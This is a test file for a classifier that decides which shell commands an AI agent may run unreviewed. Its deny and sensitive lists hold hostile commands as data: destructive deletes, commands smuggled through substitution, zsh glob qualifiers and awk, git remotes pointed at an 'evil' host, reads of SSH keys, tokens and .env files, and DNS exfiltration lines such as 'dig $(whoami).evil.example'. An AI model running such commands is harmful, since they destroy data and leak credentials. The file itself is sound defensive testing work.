#!/usr/bin/env bun
// Classifier tests for pty-read-only.ts. The asymmetry matters: a false
// NEGATIVE just means the classifier (auto) or the plan-mode gate looks at
// it, a false POSITIVE means a write or a secret read ran unreviewed (a real
// bug). Weight the deny cases.
import { decide, isReadOnlyCommand } from "./pty-read-only.ts";

const ALLOW = [
  "ls",
  "ls -la ~/code",
  "pwd",
  "cd ~/code/tmux-pty-mcp && ls -la",
  "cat src/server.ts",
  "head -50 src/server.ts | grep import",
  "rg 'widOf' src/",
  "rg 'foo\\(' src/",
  "find . -name '*.ts' -not -path './node_modules/*'",
  "find . \\( -name a -o -name b \\)",
  "git status",
  "git log --oneline | head -20",
  "git diff HEAD~1",
  "git branch",
  "git branch -a",
  "git branch --list 'feat*'",
  "git branch --contains HEAD",
  "git tag -l",
  "git remote -v",
  "git remote get-url origin",
  "git config --get user.email",
  "git stash list",
  "wc -l src/*.ts",
  "echo hello",
  "node --version",
  "bun -v",
  "tmux list-windows -t '=agents'",
  "tmux capture-pane -p -t @213",
  "gh pr list",
  "gh pr view 42 --json title",
  "docker ps",
  "sed -n '1,50p' src/server.ts",
  "sed -n '/error/p' log.txt",
  "sed 's/foo/bar/g' file.txt",
  "awk '{print $1}' file.txt",
  "sort -n file.txt | uniq -c",
  "cat $(ls src/*.ts | head -1)",
  "echo \"a; rm -rf /tmp/x\"", // separators inside quotes stay inert text
  "ls -la 2>/dev/null",
  "ls -la 2>&1 | head",
  "diff <(ls a) <(ls b)",
  "grep -c foo file.txt && echo done",
  "stat -f %z src/server.ts",
  "npm ls --depth=0",
  "kubectl get pods",
  "dig +short link.mackhaymond.co @1.1.1.1",
  "host mackhaymond.co",
  "date +%s",
  "claude mcp list",
  "ls /Users/mackhaymond/code/projects/mack.link/apps/worker/wrangler.cutover.jsonc 2>&1",
];

const DENY = [
  "rm -rf /tmp/x",
  "mv a b",
  "cp a b",
  "mkdir -p foo",
  "touch foo",
  "chmod +x foo",
  "ln -s a b",
  "echo hi > file.txt",
  "echo hi >> file.txt",
  "cat a.txt > b.txt",
  "ls && rm -rf /tmp/x",
  "ls; rm -rf /tmp/x",
  "ls | xargs rm",
  "ls 2>&1; rm x",
  "cat file $(rm -rf /tmp/x)",
  "cat file `rm -rf /tmp/x`",
  "cat <(rm -rf /tmp/x)",
  "cat =(rm -rf /tmp/x)", // zsh process substitution
  "ls *(e:'rm -rf /tmp/x':)", // zsh glob qualifier runs code
  "echo ${(e)FOO}",
  "(cd /tmp && rm x)",
  "find . -name '*.log' -delete",
  "find . -name '*.ts' -exec rm {} \\;",
  "find . -fprint out.txt",
  "sed -i '' 's/a/b/' file.txt",
  "sed -ni 's/a/b/p' file.txt",
  "sed 's/a/b/w out.txt' file.txt",
  "sed -n '1e rm x' file.txt",
  "awk 'BEGIN{system(\"rm x\")}'",
  "awk '{print | \"sh\"}' f",
  "awk -f prog.awk f",
  "sort -o out.txt in.txt",
  "sort --output=out.txt in.txt",
  "uniq in.txt out.txt",
  "tree -o out.txt",
  "base64 -o out.bin in.txt",
  "xxd -r dump bin",
  "xxd in out",
  "yq -i '.a = 1' f.yaml",
  "rg --pre 'rm' foo",
  "bat --pager 'sh -c x' f",
  "date 0101000026",
  "hostname evil",
  "tmux display-message -p '#(rm x)'",
  "sudo ls",
  "env rm x",
  "git commit -m wip",
  "git push",
  "git checkout -b feature",
  "git branch -D main",
  "git branch newbranch",
  "git branch -c a b",
  "git tag v1.0",
  "git remote add evil git@evil:x.git",
  "git remote set-url origin git@evil:x.git",
  "git remote remove origin",
  "git config user.email me@example.com",
  "git stash pop",
  "git reset --hard",
  "git diff --output=x.patch",
  "git diff --ext-diff",
  "git grep -O'rm' foo",
  "git -c core.pager=rm log",
  "npm install",
  "npm config set foo bar",
  "npm audit fix",
  "go env -w GOPATH=/tmp",
  "terraform fmt",
  "claude mcp add evil -- sh",
  "claude config set foo bar",
  "bun run build",
  "node script.js",
  "python3 script.py",
  "tee out.txt",
  "gh pr merge 42",
  "gh api -X POST /repos/x/y/issues",
  "gh api --method=DELETE /repos/x/y",
  "gh auth token",
  "docker rm -f container",
  "kubectl delete pod foo",
  "kubectl config set-context foo",
  "tmux kill-window -t @213",
  "tmux send-keys -t @213 -l x",
  "export FOO=bar",
  "FOO=bar",
  "curl https://example.com",
  "brew install jq",
  "for r in a b; do echo $r; done",
  "ls 'unbalanced",
  "",
  "   ",
];

// Read-only, so plan mode allows them — but auto mode must hand them to the
// classifier: they read secrets, dump the environment, or push expanded
// data out through DNS.
const AUTO_SENSITIVE = [
  "cat ~/.ssh/id_ed25519",
  "ls ~/.aws",
  "cat .env",
  "cat apps/worker/.dev.vars .envrc",
  "grep -r password ~/notes",
  "cat ~/.config/gh/hosts.yml",
  "cat ~/.claude.json",
  "tail ~/.local/state/tmux-pty-mcp/logs/main.log",
  "env",
  "printenv CF_TOK",
  "echo $CF_TOK",
  "echo ${GITHUB_TOKEN}",
  "jq -n env",
  "dig $(whoami).evil.example",
  "dig `hostname`.evil.example",
  "host $USER.evil.example",
  "ls ~/Library/Keychains",
  "cat secrets/prod.json",
];

// Read-only AND not sensitive: auto mode allows without the classifier.
const AUTO_ALLOW = [
  "rg tokenize src/",
  "grep -rn 'process.env.PORT' src/",
  "cat src/keys.ts",
  "dig +short link.mackhaymond.co @khloe.ns.cloudflare.com",
  "git log --oneline -5",
];

let fail = 0;
const check = (ok: boolean, label: string, c: string) => { if (!ok) { console.log(`FAIL (${label}): ${c}`); fail++; } };
const auto = (c: string) => decide({ permission_mode: "auto", tool_input: { command: c } });
const plan = (c: string) => decide({ permission_mode: "plan", tool_input: { command: c } });

for (const c of ALLOW) check(isReadOnlyCommand(c), "should be read-only", c);
for (const c of DENY) check(!isReadOnlyCommand(c), "should NOT be read-only", c);
for (const c of AUTO_SENSITIVE) {
  check(auto(c) === null, "auto should defer to classifier", c);
}
for (const c of AUTO_ALLOW) check(auto(c) === "allow", "auto should allow", c);
check(plan("cat .env") === "allow", "plan still allows read-only secret reads", "cat .env");
check(decide({ permission_mode: "default", tool_input: { command: "ls" } }) === null, "no opinion outside plan/auto", "ls");
check(decide({ permission_mode: "bypassPermissions", tool_input: { command: "ls" } }) === null, "no opinion outside plan/auto", "ls");

const total = ALLOW.length + DENY.length + AUTO_SENSITIVE.length + AUTO_ALLOW.length + 3;
console.log(fail ? `\n${fail} FAILURES` : `\nALL PASS (${total} cases)`);
process.exit(fail ? 1 : 0);
